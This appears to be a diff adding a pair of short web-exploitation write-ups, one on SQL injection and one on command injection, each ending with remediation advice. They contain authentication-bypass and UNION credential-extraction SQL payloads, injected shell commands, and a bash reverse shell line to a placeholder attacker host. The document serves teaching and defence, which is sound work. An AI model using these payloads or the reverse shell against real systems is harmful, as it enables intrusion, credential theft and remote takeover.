@@ -1,0 +1,137 @@
+# Web Exploitation – SQL Injection Write-up
+
+## 🎯 Objective
+
+Exploit a vulnerable web application to extract sensitive information.
+
+---
+
+## 🔍 Step 1: Reconnaissance
+
+* Identified login form on web application
+* Observed lack of input validation
+
+---
+
+## 💉 Step 2: SQL Injection Testing
+
+Tested payload:
+
+```sql
+' OR 1=1 --
+```
+
+### Result:
+
+* Authentication bypass successful
+
+---
+
+## 🧠 Step 3: Database Enumeration
+
+Used UNION-based SQL injection:
+
+```sql
+' UNION SELECT null, database() --
+```
+
+### Findings:
+
+* Retrieved database name
+* Identified table structure
+
+---
+
+## 🔓 Step 4: Data Extraction
+
+Extracted sensitive data:
+
+```sql
+' UNION SELECT username, password FROM users --
+```
+
+### Result:
+
+* Retrieved user credentials
+* Identified weak password practices
+
+---
+
+## 🛡️ Remediation
+
+* Use parameterized queries
+* Validate and sanitize user input
+* Implement Web Application Firewall (WAF)
+* Apply least privilege to database accounts
+
+---
+
+## 🧠 Key Takeaways
+
+* SQL Injection remains a critical vulnerability
+* Input validation is essential
+* Secure coding practices prevent exploitation
+# Web Exploitation – Command Injection
+
+## 🎯 Objective
+
+Exploit command injection vulnerability to gain system access.
+
+---
+
+## 🔍 Step 1: Input Testing
+
+Tested input field:
+
+```bash
+127.0.0.1; whoami
+```
+
+### Result:
+
+* Command execution confirmed
+
+---
+
+## 💣 Step 2: Exploitation
+
+Executed system commands:
+
+```bash
+127.0.0.1; ls
+```
+
+---
+
+## 🔓 Step 3: Reverse Shell
+
+Established reverse shell:
+
+```bash
+bash -i >& /dev/tcp/<attacker-ip>/4444 0>&1
+```
+
+---
+
+## 👑 Step 4: Post-Exploitation
+
+* Gained shell access
+* Enumerated system files
+* Escalated privileges
+
+---
+
+## 🛡️ Remediation
+
+* Sanitize user inputs
+* Avoid direct command execution
+* Use secure APIs instead of system calls
+* Implement input validation
+
+---
+
+## 🧠 Key Takeaways
+
+* Command injection can lead to full system compromise
+* Input validation is critical
+* Least privilege reduces impact
